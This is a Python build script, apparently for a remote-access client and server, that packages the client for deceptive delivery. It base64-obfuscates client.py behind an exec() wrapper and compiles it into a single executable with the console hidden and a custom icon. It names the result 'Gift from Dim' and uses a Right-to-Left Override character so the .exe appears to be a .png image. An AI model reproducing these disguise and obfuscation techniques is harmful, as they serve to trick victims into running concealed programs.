import os
import subprocess
import base64
import shutil
import sys

# from win32com.client import Dispatch
# from pathlib import Path

mask_file = open('mask_client.py', 'w')
file = open('client.py', 'r')
encoded_code = base64.b64encode(file.read().encode())
mask_file.write(
    f"import base64\nexec(base64.b64decode({encoded_code}))\n")
file.close()
mask_file.close()


# def create_shortcut(path, target='', arguments: str = '', icon: str = ''):
#     shell = Dispatch('WScript.Shell')
#     shortcut = shell.CreateShortCut(str(path))
#     shortcut.TargetPath = target
#     shortcut.WorkingDirectory = str(Path(target).parent)
#     shortcut.Arguments = arguments
#     shortcut.IconLocation = icon
#     shortcut.save()


def build_exe_client():
    filename = 'client.py'
    output = subprocess.call(
        ['venv\\Scripts\\python', '-m', 'PyInstaller', '--noconfirm', '--onefile', '-i', 'image.ico',
         '--console', '--hide-console', 'hide-early', f'{filename}']
    )
    if not output:
        if os.path.exists('dist/Подарок от дим‮gnp.exe'):
            os.remove('dist/Подарок от дим‮gnp.exe')
        shutil.copy('dist/client.exe', 'dist/Подарок от дим‮gnp.exe')
        os.remove('client.spec')


def build_exe_server():
    filename = 'server.py'
    output = subprocess.call(
        ['venv\\Scripts\\python', '-m', 'PyInstaller', '--noconfirm', '--onefile',
         '--console', f'{filename}']
    )
    if not output:
        os.remove('server.spec')


filename = input('>> ') or 'client'
if filename in ['client', 'client.py']:
    build_exe_client()
elif filename in ['server', 'server.py']:
    build_exe_server()
elif filename == 'all':
    build_exe_client()
    build_exe_server()
else:
    sys.exit(1)

shutil.rmtree('build')
